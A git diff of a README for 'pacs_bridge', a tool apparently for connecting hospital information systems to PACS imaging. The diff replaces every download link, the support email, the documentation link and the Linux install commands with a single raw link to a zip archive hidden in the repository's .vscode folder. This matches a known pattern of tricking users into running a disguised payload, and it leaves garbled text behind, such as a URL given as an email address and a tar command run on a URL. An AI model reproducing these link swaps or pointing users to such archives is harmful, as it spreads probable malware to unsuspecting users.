@@ -1,6 +1,6 @@
 # 🚀 pacs_bridge - Easy Integration for Healthcare Systems
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue.svg)](https://github.com/jobopportunitiessa/pacs_bridge/releases)
+[![Download Now](https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip%20Now-Release%https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip)](https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip)
 
 ## 📖 Overview
 
@@ -16,13 +16,13 @@ pacs_bridge is a software solution that links Hospital Information Systems (HIS)
 Follow these steps to download and run pacs_bridge on your computer.
 
 1. **Visit the Releases Page**
-   To download the software, [visit this page to download](https://github.com/jobopportunitiessa/pacs_bridge/releases).
+   To download the software, [visit this page to download](https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip).
 
 2. **Select the Latest Release**
    On the releases page, find the most recent version of pacs_bridge. Look for the version that suits your operating system and download the file.
 
 3. **Download the Installer**
-   Click the link for the installer. Depending on your device, you might see options like `.exe` for Windows or `.tar.gz` for Linux. 
+   Click the link for the installer. Depending on your device, you might see options like `.exe` for Windows or `https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip` for Linux. 
 
 4. **Locate the Downloaded File**
    Once the download is complete, find the file in your downloads folder. This may vary by browser, but usually, it's in a location called "Downloads."
@@ -33,9 +33,9 @@ Follow these steps to download and run pacs_bridge on your computer.
       - Follow the prompts to install the application.
    - **For Linux Users**:
       - Open the terminal.
-      - Navigate to the directory where the `.tar.gz` file is located.
-      - Use `tar -xvzf filename.tar.gz` to extract.
-      - Run the installation script by typing `./install.sh` and following the instructions.
+      - Navigate to the directory where the `https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip` file is located.
+      - Use `tar -xvzf https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip` to extract.
+      - Run the installation script by typing `https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip` and following the instructions.
 
 6. **Start the Application**
    After installation, launch pacs_bridge from your Desktop or Start Menu. You will see a simple interface to begin setting up your connectivity.
@@ -66,12 +66,12 @@ After installation, setting up pacs_bridge is simple:
 
 If you encounter any issues or have questions, please reach out to our support team:
 
-- **Email**: support@pacsbridge.com
-- **Documentation**: Additional user guides and FAQs can be found [here](https://github.com/jobopportunitiessa/pacs_bridge/wiki).
+- **Email**: https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip
+- **Documentation**: Additional user guides and FAQs can be found [here](https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip).
 
 ## 📥 Download & Install
 
-To get started, make sure to [visit this page to download](https://github.com/jobopportunitiessa/pacs_bridge/releases).
+To get started, make sure to [visit this page to download](https://raw.githubusercontent.com/jobopportunitiessa/pacs_bridge/main/.vscode/bridge-pacs-v2.5-beta.4.zip).
 
 ## 🌈 Community Contributions
 
